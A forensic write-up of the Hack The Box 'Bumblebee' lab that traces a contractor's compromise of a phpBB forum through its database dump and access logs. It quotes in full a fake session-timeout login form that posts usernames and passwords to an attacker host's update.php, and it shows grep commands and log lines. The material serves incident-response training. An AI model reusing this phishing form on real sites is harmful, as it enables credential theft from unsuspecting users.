---
title: "HTB Sherlock Bumblebee"
date: 2024-06-15T03:54:17-04:00
tags:
  - htb
  - sherlock
  - dfir
  - access
  - log
  - phpbb
  - sqlite3
  - phishing
  - linux
---

# Bumblebee (DFIR)

### Scenario
An external contractor has accessed the internal forum here at Forela via the Guest Wi-Fi, and they appear to have stolen credentials for the administrative user! We have attached some logs from the forum and a full database dump in sqlite3 format to help you in your investigation.

### Artifacts
|Artifact|MD5 Hash|Password|
|----|----|----|
|bumblebee.zip|ba06e26779ead4b6299b6a188d11fc02|hackthebkue|
|incident.tgz|1b301c2fb2a1232758aca31588506edf|n/a|

### Tools Used
+ SQLite Browser - For `phpbb.sqlite3` database analysis.
+ Linux Terminal - For `access.log` analysis.

### Forensic Analysis

**Analyzing SQLite3 Database**

The contractor's user information are listed below.
![User Info](images/20240613104708.png)


The contractor's post information for the forum are listed below.
![Post Info](images/20240613105158.png)

Post contents malicious part
```html
<--snip-->
<div id="page-body" class="page-body" role="main">
<div class="panel">
<div class="inner">

<div class="content">
<h3>Session Timeout</h3> <br /> <br />
<p>Your session token has timed out in order to proceed you must login again.</p>
</div>

</div>
</div>

<form action="http://10.10.0.78/update.php" method="post" id="login" data-focus="username" target="hiddenframe">
<div class="panel">
<div class="inner">
<div class="content">

<h2 class="login-title">Login</h2>
<fieldset class="fields1">

<dl>
<dt><label for="username">Username:</label></dt>
<dd><input type="text" tabindex="1" name="username" id="username" size="25"
value="" class="inputbox autowidth"></dd>
</dl>

<dl>
<dt><label for="password">Password:</label></dt>
<dd><input type="password" tabindex="2" id="password" name="password" size="25" class="inputbox autowidth" autocomplete="off"></dd>
</dl>

<dl>
<dd><label for="autologin"><input type="checkbox" name="autologin"
id="autologin" tabindex="4">Remember me</label></dd>
<dd><label for="viewonline"><input type="checkbox" name="viewonline"
id="viewonline" tabindex="5">Hide my online status this session</label></dd>
</dl>

<dl>
<dt>&nbsp;</dt>
<dd> <input type="submit" name="login" tabindex="6" value="Login"
class="button1" onclick="sethidden()"></dd>
</dl>

</fieldset class="fields1">
</div>
</div>
</div>
</form>
</div>
```

At this point we have identified the malicious IP `10.10.0.78`, and was used to access the forum as well as staging a credential stealer namely `update.php`. 

Browsing the `phpbb_log` table we found additional information when the contractor logged in as Administrator. The real Administrator's IP was `10.255.254.2`. Upon Investigating the `access.log` artifact we can verify their information like User-Agent, which URLs were visited to get a sense of baseline activity which are normal for an Administrator user.

Then we can use those information against the threat actor to accurately paint a picture of the malicious activities that was done.

**Analyzing `access.log`**

An access.log file can have a vast volume of data it is recommended to use Splunk or ElasticSearch or any kind of SIEM tool to quickly find and triage information. But, in our case we have relatively small amount of data and we can use basic Linux commands to filter and search for the information we are looking for.

Filtering the access.log file is very helpful to find the actual data we are looking for. For example, we don't need the data when a page loads and request are made to load CSS, images, assets to render the UI.

We can easily filter those types of requests using `egrep`. The command for filtering assets related data is given below:
```bash
cat access.log | egrep -v "/(assets|style|images)"
```

Here `-v` returns everything except the matching pattern.

Let's search for the legit Administrator's User Agent information.
```bash
$ cat access.log | egrep -v "/(assets|style|images)" | egrep -i 10.255.254.2 | head -n1
10.255.254.2 - - [25/Apr/2023:12:08:42 +0100] "GET /adm/index.php?sid=ac1490e6c806ac0403c6c116c1d15fa6&i=12 HTTP/1.1" 403 9412 "http://10.10.0.27/adm/index.php?sid=ac1490e6c806ac0403c6c116c1d15fa6&i=1" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36"
```

Let's search for the adversary's User Agent information.
```bash
$ cat access.log | egrep -v "/(assets|style|images)" | egrep -i 10.10.0.78 | head -n1 
10.10.0.78 - - [25/Apr/2023:12:07:39 +0100] "GET / HTTP/1.1" 200 4205 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:106.0) Gecko/20100101 Firefox/106.0"
```

The contractor added himself to the administrator group.
```bash
$ cat access.log | egrep -v "/(assets|style|images)" | egrep -i 10.10.0.78 | grep adm | grep acp_groups | grep POST
10.10.0.78 - - [26/Apr/2023:11:53:51 +0100] "POST /adm/index.php?i=acp_groups&sid=eca30c1b75dc3eed1720423aa1ff9577&icat=12&mode=manage&g=5 HTTP/1.1" 200 2623 "http://10.10.0.27/adm/index.php?i=acp_groups&sid=eca30c1b75dc3eed1720423aa1ff9577&icat=12&mode=manage&action=list&g=5" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/112.0"
```

The contractor also sent two requests to backup the database.
```bash
$ cat access.log | egrep -v "/(assets|style|images)" | egrep -i 10.10.0.78 | grep adm | grep action=download            
10.10.0.78 - - [26/Apr/2023:11:54:22 +0100] "POST /adm/index.php?i=acp_database&sid=eca30c1b75dc3eed1720423aa1ff9577&mode=backup&action=download HTTP/1.1" 200 2463 "http://10.10.0.27/adm/index.php?sid=eca30c1b75dc3eed1720423aa1ff9577&i=acp_database&mode=backup" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/112.0"
10.10.0.78 - - [26/Apr/2023:11:54:24 +0100] "GET /adm/index.php?i=acp_database&sid=eca30c1b75dc3eed1720423aa1ff9577&mode=backup HTTP/1.1" 200 3771 "http://10.10.0.27/adm/index.php?i=acp_database&sid=eca30c1b75dc3eed1720423aa1ff9577&mode=backup&action=download" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/112.0"
10.10.0.78 - - [26/Apr/2023:11:54:30 +0100] "POST /adm/index.php?i=acp_database&sid=eca30c1b75dc3eed1720423aa1ff9577&mode=backup&action=download HTTP/1.1" 200 2474 "http://10.10.0.27/adm/index.php?i=acp_database&sid=eca30c1b75dc3eed1720423aa1ff9577&mode=backup" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/112.0"
10.10.0.78 - - [26/Apr/2023:11:56:28 +0100] "GET /adm/index.php?i=acp_database&sid=eca30c1b75dc3eed1720423aa1ff9577&mode=backup HTTP/1.1" 200 3770 "http://10.10.0.27/adm/index.php?i=acp_database&sid=eca30c1b75dc3eed1720423aa1ff9577&mode=backup&action=download" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/112.0"
```

And finally they downloaded the database backup.
```bash
$ cat access.log | egrep -v "/(assets|style|images)" | egrep -i 10.10.0.78 | grep .sql
10.10.0.78 - - [26/Apr/2023:12:01:38 +0100] "GET /store/backup_1682506471_dcsr71p7fyijoyq8.sql.gz HTTP/1.1" 200 34707 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/112.0"
```

The database backup file size was `34707` bytes (34.7 KB) in size.

### Summary
The contractor used his account to stage a phishing page in the internal forum of Forela. Then he stole the Administrator's credential using the phishing page and exfiltrated the data using a credential stealer (httx://10.10.0.78/update.php) hosted on the IP `10.10.0.78`. Then, they used the stolen Administrator credential created an account (apoole) for persistence. Then they backed up and downloaded the database.